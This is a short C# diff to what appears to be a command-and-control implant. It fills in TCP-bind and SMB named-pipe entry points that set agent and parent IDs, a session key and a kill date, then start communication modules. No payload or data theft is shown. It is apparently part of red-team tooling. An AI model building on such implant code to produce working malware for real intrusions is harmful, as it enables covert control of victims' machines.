@@ -3,6 +3,7 @@ using Agent.Controllers;
 using Agent.Interfaces;
 using Agent.Models;
 using Agent.Modules;
+
 using System;
 
 namespace Agent
@@ -28,14 +29,32 @@ namespace Agent
             Execute(config, commModule);
         }
 
-        public static void TCPEntry(string AgentID, string ParentAgentID, DateTime KillDate, string BindAddress, int BindPort)
+        public static void TCPEntry(string AgentID, string ParentAgentID, byte[] EncKey, DateTime KillDate, string BindAddress, int BindPort)
         {
+            ID = AgentID;
+            ParentID = ParentAgentID;
+            SessionKey = EncKey;
 
+            var config = new ConfigController();
+            config.Set(AgentConfig.KillDate, KillDate);
+
+            var commModule = new TCPCommModule(BindAddress, BindPort);
+
+            Execute(config, commModule);
         }
 
-        public static void SMBEntry(string AgentID, string ParentAgentID, DateTime KillDate, string PipeName)
+        public static void SMBEntry(string AgentID, string ParentAgentID, byte[] EncKey, DateTime KillDate, string PipeName)
         {
+            ID = AgentID;
+            ParentID = ParentAgentID;
+            SessionKey = EncKey;
 
+            var config = new ConfigController();
+            config.Set(AgentConfig.KillDate, KillDate);
+
+            var commModule = new SMBCommModule(PipeName);
+
+            Execute(config, commModule);
         }
 
         static void Execute(ConfigController Config, ICommModule CommModule)
